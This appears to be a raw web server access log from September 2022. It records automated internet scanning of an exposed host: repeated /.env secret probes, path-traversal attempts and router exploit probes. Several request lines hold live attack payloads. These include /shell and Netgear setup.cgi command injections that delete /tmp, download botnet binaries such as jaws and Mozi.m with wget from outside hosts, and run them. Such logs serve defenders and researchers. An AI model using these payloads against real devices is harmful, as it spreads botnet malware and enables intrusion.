135.125.246.110 - - [07/Sep/2022:16:19:59 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:16:19:59 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.62.197.62 - - [07/Sep/2022:16:28:28 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
138.197.67.131 - - [07/Sep/2022:16:31:17 +0000] "GET / HTTP/1.0" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
138.197.67.131 - - [07/Sep/2022:17:04:38 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
138.197.67.131 - - [07/Sep/2022:17:04:38 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "http://35.172.128.201/" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
135.125.246.110 - - [07/Sep/2022:17:34:50 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:17:34:50 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.118.53.210 - - [07/Sep/2022:17:39:13 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.118.53.210 - - [07/Sep/2022:17:39:14 +0000] "HEAD /icons/sphere1.png HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.118.53.210 - - [07/Sep/2022:17:39:14 +0000] "HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1" 400 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.118.53.210 - - [07/Sep/2022:17:39:14 +0000] "HEAD /icons/.%%32%65/.%%32%65/apache2/icons/sphere1.png HTTP/1.1" 400 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.118.53.210 - - [07/Sep/2022:17:39:14 +0000] "HEAD /icons/.%%32%65/.%%32%65/apache2/icons/non-existant-image.png HTTP/1.1" 400 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:18:02:02 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:18:02:02 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:19:30:42 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:19:30:42 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:19:33:27 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:19:33:28 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:20:45:09 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:20:45:10 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:21:04:20 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:21:04:20 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:21:24:21 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:21:24:21 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.214.48 - - [07/Sep/2022:21:54:17 +0000] "GET /actuator/health HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
205.210.31.9 - - [07/Sep/2022:21:56:20 +0000] "GET / HTTP/1.0" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
192.241.207.202 - - [07/Sep/2022:22:06:56 +0000] "GET /hudson HTTP/1.1" 404 196 "-" "Mozilla/5.0 zgrab/0.x"
95.214.235.205 - - [07/Sep/2022:22:12:08 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [07/Sep/2022:22:12:09 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:22:50:54 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [07/Sep/2022:22:50:54 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [08/Sep/2022:00:07:03 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [08/Sep/2022:00:07:04 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.13.181.144 - - [08/Sep/2022:00:33:47 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
51.13.181.144 - - [08/Sep/2022:00:33:48 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
193.46.255.199 - - [08/Sep/2022:00:37:19 +0000] "GET /Electron/download/windows/\\Windows\\win.ini HTTP/1.0" 404 196 "-" "xfa1"
205.210.31.141 - - [08/Sep/2022:00:45:28 +0000] "\x16\x03\x01" 400 226 "-" "-"
209.141.43.103 - - [08/Sep/2022:00:53:07 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
128.14.134.134 - - [08/Sep/2022:01:09:17 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
205.210.31.137 - - [08/Sep/2022:01:42:57 +0000] "GET / HTTP/1.1" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
41.238.216.199 - - [08/Sep/2022:01:54:07 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+botnet.psscc.cn/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
135.125.246.110 - - [08/Sep/2022:02:07:41 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [08/Sep/2022:02:07:41 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.94.146.60 - - [08/Sep/2022:02:46:30 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
167.94.146.60 - - [08/Sep/2022:02:46:30 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.60 - - [08/Sep/2022:02:46:30 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Go-http-client/1.1"
95.214.235.205 - - [08/Sep/2022:02:57:16 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [08/Sep/2022:02:57:16 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
34.140.248.32 - - [08/Sep/2022:03:05:20 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
135.125.246.110 - - [08/Sep/2022:03:36:12 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [08/Sep/2022:03:36:12 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.25.190.81 - - [08/Sep/2022:04:12:50 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.25.190.81 - - [08/Sep/2022:04:12:51 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
94.102.49.193 - - [08/Sep/2022:04:21:55 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
94.102.49.193 - - [08/Sep/2022:04:21:55 +0000] "GET /robots.txt HTTP/1.1" 404 196 "-" "-"
94.102.49.193 - - [08/Sep/2022:04:21:56 +0000] "GET /sitemap.xml HTTP/1.1" 404 196 "-" "-"
94.102.49.193 - - [08/Sep/2022:04:21:58 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 196 "-" "-"
94.102.49.193 - - [08/Sep/2022:04:22:00 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
135.125.246.110 - - [08/Sep/2022:04:25:07 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [08/Sep/2022:04:25:08 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
128.14.134.134 - - [08/Sep/2022:05:08:54 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
135.125.246.110 - - [08/Sep/2022:05:41:31 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.110 - - [08/Sep/2022:05:41:32 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:07:09:39 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:07:09:39 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:08:04:59 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:08:04:59 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
14.155.16.158 - - [08/Sep/2022:08:25:43 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://14.155.16.158:59078/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 196 "-" "-"
192.241.204.101 - - [08/Sep/2022:09:04:16 +0000] "MGLNDD_35.172.128.201_80\n" 400 226 "-" "-"
205.185.113.166 - - [08/Sep/2022:09:47:47 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
135.125.244.48 - - [08/Sep/2022:10:00:03 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:10:00:04 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
120.86.255.225 - - [08/Sep/2022:10:28:08 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 196 "-" "Hello, World"
135.125.244.48 - - [08/Sep/2022:11:15:50 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:11:15:50 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.131.66.209 - - [08/Sep/2022:11:30:38 +0000] "GET / HTTP/1.1" 200 32 "-" "curl/7.64.1"
34.159.96.12 - - [08/Sep/2022:11:34:15 +0000] "\x16\x03\x01" 400 226 "-" "-"
34.159.96.12 - - [08/Sep/2022:11:34:21 +0000] "OPTIONS / HTTP/1.0" 200 - "-" "-"
209.141.51.222 - - [08/Sep/2022:12:20:55 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.51.222 - - [08/Sep/2022:12:20:56 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:12:21:06 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.51.222 - - [08/Sep/2022:12:21:06 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:12:21:06 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.51.222 - - [08/Sep/2022:12:21:06 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
172.104.242.173 - - [08/Sep/2022:12:29:12 +0000] "GET /0bef HTTP/1.0" 404 196 "-" "-"
113.161.206.164 - - [08/Sep/2022:13:22:13 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
205.185.113.166 - - [08/Sep/2022:13:23:49 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
143.92.32.88 - - [08/Sep/2022:13:28:36 +0000] "GET / HTTP/1.1" 200 32 "-" "<title>(.*?)</title>"
2.183.102.134 - - [08/Sep/2022:13:32:37 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:13:39:48 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:13:39:48 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
81.70.9.83 - - [08/Sep/2022:14:29:27 +0000] "GET / HTTP/1.1" 200 32 "-" "'Mozilla/5.0"
135.125.244.48 - - [08/Sep/2022:14:33:51 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:14:33:51 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.161.131.237 - - [08/Sep/2022:15:06:05 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 zgrab/0.x"
135.125.244.48 - - [08/Sep/2022:15:41:23 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:15:41:23 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
134.122.38.254 - - [08/Sep/2022:16:11:22 +0000] "HEAD / HTTP/1.0" 200 - "-" "-"
134.122.38.254 - - [08/Sep/2022:16:11:22 +0000] "GET /system_api.php HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
134.122.38.254 - - [08/Sep/2022:16:11:22 +0000] "GET /c/version.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
134.122.38.254 - - [08/Sep/2022:16:11:22 +0000] "GET /streaming/clients_live.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
134.122.38.254 - - [08/Sep/2022:16:11:22 +0000] "GET /stalker_portal/c/version.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
134.122.38.254 - - [08/Sep/2022:16:11:22 +0000] "GET /stream/live.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Spotify / 1.1.39.612 Safari / 537.36"
134.122.38.254 - - [08/Sep/2022:16:11:22 +0000] "GET /flu/403.html HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
134.122.38.254 - - [08/Sep/2022:16:11:22 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
52.180.152.13 - - [08/Sep/2022:16:20:40 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.180.152.13 - - [08/Sep/2022:16:20:41 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.180.152.13 - - [08/Sep/2022:16:20:42 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
95.214.235.205 - - [08/Sep/2022:16:29:58 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [08/Sep/2022:16:30:00 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
184.105.139.70 - - [08/Sep/2022:16:30:17 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
171.119.241.107 - - [08/Sep/2022:16:39:56 +0000] "POST /HNAP1/ HTTP/1.0" 400 226 "-" "-"
105.68.193.8 - - [08/Sep/2022:17:05:39 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
105.68.193.8 - - [08/Sep/2022:17:05:39 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
196.191.194.4 - - [08/Sep/2022:17:26:29 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.143.223.179/lol.sh;sh+/tmp/lol.sh HTTP/1.1" 404 196 "-" "Hello, world"
95.214.235.205 - - [08/Sep/2022:17:50:57 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.205 - - [08/Sep/2022:17:50:58 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:18:06:00 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:18:06:01 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.118.53.210 - - [08/Sep/2022:18:24:24 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
223.70.251.51 - - [08/Sep/2022:18:24:57 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1" 404 196 "-" "Hello, world"
135.125.244.48 - - [08/Sep/2022:18:54:25 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:18:54:25 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:20:15:23 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:20:15:23 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
94.102.61.10 - - [08/Sep/2022:20:21:15 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
46.30.188.218 - - [08/Sep/2022:20:58:08 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
185.220.101.172 - - [08/Sep/2022:20:58:14 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
64.225.5.28 - - [08/Sep/2022:20:58:21 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
135.125.244.48 - - [08/Sep/2022:21:18:57 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
